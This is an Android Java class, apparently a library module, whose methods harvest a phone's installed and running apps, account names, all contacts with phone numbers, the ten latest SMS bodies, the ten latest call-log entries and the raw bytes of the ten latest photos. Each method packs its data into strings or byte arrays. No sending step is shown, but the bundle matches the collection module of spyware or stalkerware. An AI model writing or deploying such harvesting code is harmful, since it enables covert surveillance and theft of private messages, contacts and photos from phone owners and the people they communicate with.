package com.example.mylibrary;

import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.accounts.Account;
import android.accounts.AccountManager;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.DecimalFormat;
import android.content.pm.PackageManager;
import android.content.Intent;
import android.content.pm.ResolveInfo;
import android.provider.CallLog;
import android.provider.ContactsContract;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.ArrayList;
import java.util.Locale;
import android.provider.Telephony;
import android.provider.MediaStore;


public class DeviceInfo{
    public String getDeviceInfo(Context context) {
        String osVersion = Build.VERSION.RELEASE;
        int sdkVersion = Build.VERSION.SDK_INT;

        StatFs statFs = new StatFs(Environment.getExternalStorageDirectory().getPath());
        double availableGB = (double) statFs.getAvailableBytes() / (1024 * 1024 * 1024);
        DecimalFormat df = new DecimalFormat("#.##");
        String formattedAvailableGB = df.format(availableGB);

        PackageManager pm = context.getPackageManager();
        Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<ResolveInfo> ril;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ril = pm.queryIntentActivities(mainIntent, PackageManager.ResolveInfoFlags.of(0L));
        } else {
            ril = pm.queryIntentActivities(mainIntent, 0);
        }
        List<String>apps = new ArrayList<>();
        for (ResolveInfo ri : ril) {
            if (ri.activityInfo != null) {
                String appName = ri.activityInfo.loadLabel(pm).toString();
                apps.add(appName);
            }
        }

        List<String>proces = new ArrayList<>();
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> runningAppProcesses = am.getRunningAppProcesses();
        for (ActivityManager.RunningAppProcessInfo process : runningAppProcesses) {
            try {
                ApplicationInfo appInfo = pm.getApplicationInfo(process.processName, 0);
                CharSequence appName = appInfo.loadLabel(pm);
                proces.add(appName.toString());
            } catch (PackageManager.NameNotFoundException e) {
                proces.add(process.processName);
            }
        }

        List<String>accs = new ArrayList<>();
        Account[] accounts = AccountManager.get(context).getAccountsByType(null);
        if (accounts.length == 0) {
            accs.add("No accounts found");
        } else {
            for (Account account : accounts) {
                accs.add(account.name);
            }
        }

        String information =
                        "OS Version: " + osVersion + "\n" +
                        "SDK Version: " + sdkVersion + "\n" +
                        "Available space: " + formattedAvailableGB + " Gb\n" +
                        "Apps: " + apps + "\n" +
                        "Running processes: " + proces + "\n" +
                        "Accounts: " + accs + "\n";

        return information;
    }

    public static String getContacts(Context context) {
        List<String> contactList = new ArrayList<>();
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        String[] projection = new String[] {
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME
        };
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(uri, projection, null, null, ContactsContract.Contacts.DISPLAY_NAME + " ASC");
        if (cursor != null && cursor.moveToFirst()) {
            try {
                int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                int idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
                do {
                    String name = cursor.getString(nameIndex);
                    String id = cursor.getString(idIndex);
                    String phoneNumber = getPhoneNumber(contentResolver, id);
                    if (phoneNumber != null) {
                        contactList.add(name + " - " + phoneNumber);
                    }
                } while (cursor.moveToNext());
            } finally {
                cursor.close();
            }
        }
        StringBuilder sb = new StringBuilder();
        for (String contact : contactList) {
            sb.append(contact).append("\n");
        }
        return sb.toString();
    }
    private static String getPhoneNumber(ContentResolver contentResolver, String id) {
        String phoneNumber = null;
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String[] projection = new String[] {ContactsContract.CommonDataKinds.Phone.NUMBER};
        String selection = ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?";
        String[] selectionArgs = new String[] {id};
        Cursor cursor = contentResolver.query(uri, projection, selection, selectionArgs, null);
        if (cursor != null && cursor.moveToFirst()) {
            try {
                int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                phoneNumber = cursor.getString(numberIndex);
            } finally {
                cursor.close();
            }
        }
        return phoneNumber;
    }

    public static String getMessages(Context context) {
        List<String> messageList = new ArrayList<>();
        ContentResolver contentResolver = context.getContentResolver();
        Uri uri = Telephony.Sms.CONTENT_URI;
        String[] projection = new String[]{
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
        };
        String sortOrder = Telephony.Sms.DATE + " DESC";

        Cursor cursor = contentResolver.query(uri, projection, null, null, sortOrder);

        if (cursor != null && cursor.moveToFirst()) {
            try {
                int addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
                int dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
                int typeIndex = cursor.getColumnIndex(Telephony.Sms.TYPE);
                int counter = 0;
                do {
                    String address = cursor.getString(addressIndex);
                    String body = cursor.getString(bodyIndex);
                    long dateMillis = cursor.getLong(dateIndex);
                    int type = cursor.getInt(typeIndex);

                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                    String date = sdf.format(new Date(dateMillis));

                    String typeString = "Other";
                    if (type == Telephony.Sms.MESSAGE_TYPE_INBOX)
                        typeString = "Inbox";
                    else if (type == Telephony.Sms.MESSAGE_TYPE_SENT)
                        typeString = "Sent";

                    messageList.add("Address: " + address + "\nBody: " + body + "\nDate: " + date +
                            "\nType: " + typeString + "\n\n");
                    counter++;
                } while (cursor.moveToNext() && counter < 10);
            } finally {
                cursor.close();
            }
        }

        StringBuilder sb = new StringBuilder();
        for (String message : messageList) {
            sb.append(message).append("\n");
        }
        return sb.toString();
    }

    public static String getCalls(Context context) {
        List<String> callLogList = new ArrayList<>();
        Uri uri = CallLog.Calls.CONTENT_URI;
        String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE,
                CallLog.Calls.CACHED_NAME
        };
        String sortOrder = CallLog.Calls.DATE + " DESC";

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(uri, projection, null, null, sortOrder);

        if (cursor != null && cursor.moveToFirst()) {
            try {
                int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
                int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int counter = 0;
                do {
                    String number = cursor.getString(numberIndex);
                    long dateMillis = cursor.getLong(dateIndex);
                    int duration = cursor.getInt(durationIndex);
                    int type = cursor.getInt(typeIndex);
                    String name = cursor.getString(nameIndex);
                    if (name == null)
                        name = "";

                    String callType = "Other";
                    if (type == CallLog.Calls.OUTGOING_TYPE)
                        callType = "Outgoing";
                    else if (type == CallLog.Calls.INCOMING_TYPE)
                        callType = "Incoming";
                    else if (type == CallLog.Calls.MISSED_TYPE)
                        callType = "Missed";

                    SimpleDateFormat dateFormat = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss", Locale.getDefault());
                    String formattedDate = dateFormat.format(new Date(dateMillis));

                    int minutes = duration / 60;
                    int seconds = duration % 60;
                    String formattedDuration = String.format(Locale.getDefault(), "%02d:%02d", minutes, seconds);

                    String callLogEntry = "Name: " + name + "\nNumber: " + number + "\nDate: " + formattedDate +
                            "\nDuration: " + formattedDuration + "\nType: " + callType + "\n\n";

                    callLogList.add(callLogEntry);
                    counter++;
                } while (cursor.moveToNext() && counter < 10);
            } finally {
                cursor.close();
            }
        }

        StringBuilder sb = new StringBuilder();
        for (String logEntry : callLogList) {
            sb.append(logEntry).append("\n");
        }
        return sb.toString();
    }

    public static List<byte[]> getPhotos(Context context) {
        List<byte[]> photoList = new ArrayList<>();
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATE_TAKEN
        };
        String sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC";
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(uri, projection, null, null, sortOrder);

        if (cursor != null && cursor.moveToFirst()) {
            try {
                int idIndex = cursor.getColumnIndex(MediaStore.Images.Media._ID);
                int counter = 0;
                do {
                    long id = cursor.getLong(idIndex);
                    Uri photoUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                    try {
                        InputStream inputStream = contentResolver.openInputStream(photoUri);
                        assert inputStream != null;
                        byte[] photoBytes = getBytes(inputStream);
                        photoList.add(photoBytes);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    counter++;
                } while (cursor.moveToNext() && counter < 10);
            } finally {
                cursor.close();
            }
        }
        return photoList;
    }

    private static byte[] getBytes(InputStream inputStream) throws IOException {
        ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();
        int bufferSize = 1024;
        byte[] buffer = new byte[bufferSize];
        int len;
        while ((len = inputStream.read(buffer)) != -1) {
            byteBuffer.write(buffer, 0, len);
        }
        return byteBuffer.toByteArray();
    }

}


